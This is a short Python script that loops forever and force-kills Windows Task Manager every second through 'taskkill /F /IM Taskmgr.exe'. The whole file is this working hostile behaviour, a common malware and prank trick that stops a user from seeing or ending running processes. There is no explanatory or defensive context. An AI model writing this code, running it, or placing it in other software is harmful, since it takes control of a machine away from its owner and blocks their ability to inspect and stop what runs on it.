import os
from time import sleep
while True:
    os.system("taskkill /F /IM Taskmgr.exe")
    sleep(1)